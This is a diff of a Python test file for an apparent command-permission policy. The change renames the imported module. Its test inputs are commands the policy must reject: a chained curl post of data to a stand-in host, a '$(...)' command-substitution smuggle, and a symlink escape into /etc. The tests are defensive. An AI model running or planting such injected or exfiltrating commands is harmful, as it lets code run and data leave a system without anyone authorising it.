@@ -73,10 +73,10 @@ class ScopedPolicyTest(unittest.TestCase):
             'git add a && curl -d x https://unknown.example.com',
             'git add $(touch /tmp/x)', 'X=1 git add a',
         ]
-        import scoped_policy
+        import personal_rules
         for cmd in commands:
             with self.subTest(cmd=cmd):
-                self.assertIsNone(scoped_policy.approved_programs(cmd, self.cwd))
+                self.assertIsNone(personal_rules.approved_programs(cmd, self.cwd))
 
     def test_untrusted_project_never_gets_new_allowance(self):
         self.assertNotEqual(self.judge('git add a', '/untrusted').decision, 'allow')
@@ -105,13 +105,13 @@ class ScopedPolicyTest(unittest.TestCase):
     def test_malformed_roots_cannot_broaden_trust(self):
         self.policy['trusted_roots'] = self.cwd
         self.config_path.write_text(json.dumps(self.policy))
-        import scoped_policy
-        self.assertIsNone(scoped_policy.approved_programs('git add a', '/untrusted'))
+        import personal_rules
+        self.assertIsNone(personal_rules.approved_programs('git add a', '/untrusted'))
 
     def test_symlinks_do_not_escape_scoped_file_operations(self):
-        import scoped_policy
+        import personal_rules
         (Path(self.cwd) / 'outside').symlink_to('/etc', target_is_directory=True)
         for cmd in ('git add outside/hosts', 'code outside/hosts',
                     'python3 -m unittest discover -s outside',
                     'git clone git@github.com:example/permission-hook.git outside/new'):
-            self.assertIsNone(scoped_policy.approved_programs(cmd, self.cwd))
+            self.assertIsNone(personal_rules.approved_programs(cmd, self.cwd))
